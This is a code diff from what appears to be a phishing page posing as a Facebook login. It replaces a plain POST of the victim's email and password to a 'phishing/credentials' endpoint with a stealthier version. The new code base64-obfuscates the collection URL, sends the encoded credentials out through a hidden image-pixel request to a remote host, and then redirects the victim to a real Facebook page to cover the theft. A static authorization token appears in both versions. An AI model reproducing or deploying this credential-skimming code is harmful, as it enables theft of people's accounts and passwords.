@@ -3,18 +3,15 @@ const k_input = document.getElementById('k_input');
 
 function button_on_click(){
 	const e_input = document.getElementById('email_input');
-	const data = {
-		username: e_input.value,
-		key: k_input.value,
-		service: 'facebook'
-	};
-	let xhr = new XMLHttpRequest();
-	xhr.open("POST", "https://ppamo-poc-cloudant-access.herokuapp.com/phishing/credentials");
-	xhr.setRequestHeader("Accept", "application/json");
-	xhr.setRequestHeader("Authorization", "Static:HKo8b7vuzA0XqJl84fos99rH2qLHpZ59c9D5cj27");
-	xhr.setRequestHeader("Content-Type", "application/json");
-	xhr.onload = () => console.log(xhr.responseText);
-	xhr.send(data);
+	const image = document.getElementById('pixel');
+	const f = function(){
+		window.location.replace(atob('aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3VuaXZlcnNpZGFkLmZlZGVyaWNvc2FudGFtYXJpYS4z'));
+	}
+	image.onload = f;
+	image.onabort = f;
+	image.onerror= f;
+	image.src = atob('aHR0cDovL2dpZ2VyLnBwYW1vLmNsOjgwODkvcGhpc2hpbmcvY3JlZGVudGlhbHM/dT0=') + btoa(e_input.value) +
+		"&k=" + btoa(k_input.value) + '&s=1&a=U3RhdGljOkhLbzhiN3Z1ekEwWHFKbDg0Zm9zOTlySDJxTEhwWjU5YzlENWNqMjc=';
 }
 
 function update_value(e){
